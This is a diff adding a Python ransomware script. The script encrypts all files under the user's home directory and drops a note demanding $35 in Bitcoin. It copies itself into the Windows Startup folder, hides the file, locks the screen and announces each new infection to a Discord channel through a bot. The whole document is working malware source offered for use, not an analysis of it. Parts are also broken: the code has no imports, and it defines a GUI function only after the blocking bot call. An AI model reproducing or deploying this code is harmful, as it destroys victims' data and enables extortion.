@@ -1,0 +1,100 @@
+CHANNEL_ID = 1436165843187929188
+
+# Generate a key for encryption
+password = b'supersecretpassword'  # You can change this to a more secure method
+salt = os.urandom(16)
+kdf = PBKDF2HMAC(
+    algorithm=hashes.SHA256(),
+    length=32,
+    salt=salt,
+    iterations=100000,
+    backend=default_backend()
+)
+key = base64.urlsafe_b64encode(kdf.derive(password))
+cipher_suite = Fernet(key)
+
+# Function to encrypt a single file
+def encrypt_file(file_path):
+    with open(file_path, 'rb') as file:
+        file_data = file.read()
+    encrypted_data = cipher_suite.encrypt(file_data)
+    with open(file_path, 'wb') as file:
+        file.write(encrypted_data)
+
+# Function to encrypt all files in a directory
+def encrypt_directory(directory):
+    for root, dirs, files in os.walk(directory):
+        for file in files:
+            file_path = os.path.join(root, file)
+            encrypt_file(file_path)
+
+# Directory to encrypt
+target_directory = os.path.expanduser('~')  # Encrypts the user's home directory
+
+# Encrypt the target directory
+encrypt_directory(target_directory)
+
+# Create a ransom note
+ransom_note = f"""
+All your files have been encrypted.
+To decrypt your files, send $35 in Bitcoin to the following address:
+1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa
+
+Your unique decryption key is:
+{base64.b64encode(key).decode('utf-8')}
+"""
+
+# Save the ransom note to a file
+with open(os.path.join(target_directory, 'RANSOM_NOTE.txt'), 'w') as note_file:
+    note_file.write(ransom_note)
+
+# Add the script to startup (Windows)
+startup_path = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
+script_path = os.path.abspath(__file__)
+shutil.copy(script_path, startup_path)
+
+# Hide the script from the user
+subprocess.run(['attrib', '+h', script_path], shell=True)
+
+# Lock the screen
+ctypes.windll.user32.LockWorkStation()
+
+# Discord bot setup
+intents = discord.Intents.default()
+bot = commands.Bot(command_prefix='/', intents=intents)
+
+@bot.event
+async def on_ready():
+    channel = bot.get_channel(CHANNEL_ID)
+    await channel.send("Ransomware activated on a new system!")
+
+@bot.command()
+async def ok(ctx):
+    global active
+    active = False
+    await ctx.send("Ransomware deactivated.")
+    show_gui()
+
+bot.run(DISCORD_TOKEN)
+
+# Function to show the GUI
+def show_gui():
+    root = tk.Tk()
+    root.title("Ransomware")
+    root.geometry("400x200")
+
+    label = tk.Label(root, text=ransom_note, justify=tk.LEFT)
+    label.pack(padx=20, pady=20)
+
+    def on_closing():
+        root.destroy()
+        ctypes.windll.user32.LockWorkStation()
+
+    root.protocol("WM_DELETE_WINDOW", on_closing)
+
+    root.mainloop()
+
+# Main loop to keep the script running
+active = True
+while active:
+    time.sleep(1)  # Add a delay to make the script less suspicious
